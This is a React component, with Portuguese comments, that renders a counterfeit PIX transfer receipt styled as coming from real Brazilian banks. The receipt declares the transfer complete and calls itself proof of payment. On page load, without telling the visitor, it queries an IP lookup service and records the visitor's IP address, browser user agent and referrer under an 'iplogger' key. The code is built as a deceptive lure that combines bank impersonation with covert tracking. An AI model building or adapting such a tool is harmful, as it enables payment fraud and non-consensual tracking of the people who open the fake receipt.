
import React, { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';

interface ReceiptData {
  recipientName: string;
  pixKey: string;
  senderName: string;
  amount: number;
  bank: string;
  createdAt: string;
}

interface AccessData {
  id: string;
  timestamp: string;
  ip: string;
  userAgent: string;
  referrer: string;
  type: 'receipt';
  receiptId: string;
}

const ReceiptDisplay: React.FC = () => {
  const { receiptId } = useParams<{ receiptId: string }>();
  const [receiptData, setReceiptData] = useState<ReceiptData | null>(null);

  const banks = {
    bradesco: { name: 'Bradesco', color: 'bg-red-600', textColor: 'text-white' },
    bb: { name: 'Banco do Brasil', color: 'bg-yellow-500', textColor: 'text-black' },
    sicredi: { name: 'Sicredi', color: 'bg-green-600', textColor: 'text-white' },
    itau: { name: 'Itaú Unibanco', color: 'bg-orange-500', textColor: 'text-white' },
    santander: { name: 'Santander', color: 'bg-red-500', textColor: 'text-white' },
    caixa: { name: 'Caixa Econômica Federal', color: 'bg-blue-600', textColor: 'text-white' },
    nubank: { name: 'Nubank', color: 'bg-purple-600', textColor: 'text-white' },
    inter: { name: 'Banco Inter', color: 'bg-orange-600', textColor: 'text-white' }
  };

  useEffect(() => {
    if (receiptId) {
      // Buscar dados do comprovante
      const savedReceipts = localStorage.getItem('iplogger-receipts');
      if (savedReceipts) {
        const receipts = JSON.parse(savedReceipts);
        const receipt = receipts[receiptId];
        if (receipt) {
          setReceiptData(receipt);
        }
      }
      
      // Capturar acesso
      captureAccess();
    }
  }, [receiptId]);

  const captureAccess = async () => {
    try {
      let realIP = 'IP não disponível';
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        realIP = ipData.ip;
      } catch (error) {
        console.log('Não foi possível obter IP externo');
        realIP = 'localhost';
      }

      const newAccess: AccessData = {
        id: Date.now().toString(),
        timestamp: new Date().toISOString(),
        ip: realIP,
        userAgent: navigator.userAgent,
        referrer: document.referrer || 'Acesso Direto',
        type: 'receipt',
        receiptId: receiptId!
      };

      // Salvar no localStorage
      const savedData = localStorage.getItem('iplogger-data');
      const existingData: AccessData[] = savedData ? JSON.parse(savedData) : [];
      const updatedData = [...existingData, newAccess];
      localStorage.setItem('iplogger-data', JSON.stringify(updatedData));

      console.log('Acesso ao comprovante capturado:', newAccess);
    } catch (error) {
      console.error('Erro ao capturar acesso:', error);
    }
  };

  if (!receiptData) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-500 mx-auto mb-4"></div>
          <p className="text-gray-600">Carregando comprovante...</p>
        </div>
      </div>
    );
  }

  const bankInfo = banks[receiptData.bank as keyof typeof banks] || banks.sicredi;
  
  const formatCurrency = (value: number) => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    }).format(value);
  };

  const formatDate = (dateString: string) => {
    const date = new Date(dateString);
    return date.toLocaleString('pt-BR');
  };

  const transactionId = receiptId?.toUpperCase().slice(0, 8);

  return (
    <div className="min-h-screen bg-gray-100 py-8 px-4">
      <div className="max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden">
        {/* Header do Banco */}
        <div className={`${bankInfo.color} ${bankInfo.textColor} p-4 text-center`}>
          <h1 className="text-xl font-bold">{bankInfo.name}</h1>
          <p className="text-sm opacity-90">Comprovante de Transferência PIX</p>
        </div>

        {/* Status */}
        <div className="bg-green-50 border-l-4 border-green-500 p-4">
          <div className="flex items-center">
            <div className="flex-shrink-0">
              <svg className="h-5 w-5 text-green-400" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="ml-3">
              <p className="text-sm font-medium text-green-800">
                Transferência realizada com sucesso
              </p>
            </div>
          </div>
        </div>

        {/* Dados da Transferência */}
        <div className="p-6 space-y-4">
          <div className="border-b pb-4">
            <h2 className="text-lg font-semibold text-gray-900 mb-3">Detalhes da Transferência</h2>
            
            <div className="space-y-3">
              <div>
                <label className="block text-sm font-medium text-gray-600">Valor</label>
                <p className="text-2xl font-bold text-green-600">{formatCurrency(receiptData.amount)}</p>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-600">Para</label>
                <p className="text-lg font-semibold text-gray-900">{receiptData.recipientName}</p>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-600">Chave PIX</label>
                <p className="text-sm text-gray-700 break-all">{receiptData.pixKey}</p>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-600">De</label>
                <p className="text-sm text-gray-700">{receiptData.senderName}</p>
              </div>
            </div>
          </div>

          <div className="space-y-2 text-sm text-gray-600">
            <div className="flex justify-between">
              <span>Data e hora:</span>
              <span>{formatDate(receiptData.createdAt)}</span>
            </div>
            <div className="flex justify-between">
              <span>ID da transação:</span>
              <span className="font-mono">{transactionId}</span>
            </div>
            <div className="flex justify-between">
              <span>Tipo:</span>
              <span>PIX</span>
            </div>
            <div className="flex justify-between">
              <span>Status:</span>
              <span className="text-green-600 font-medium">Concluída</span>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="bg-gray-50 px-6 py-4 text-center">
          <p className="text-xs text-gray-500">
            Este comprovante serve como prova da transferência realizada via PIX.
            Guarde-o para seus registros.
          </p>
          <p className="text-xs text-gray-400 mt-2">
            {bankInfo.name} • Instituição Financeira
          </p>
        </div>
      </div>
    </div>
  );
};

export default ReceiptDisplay;
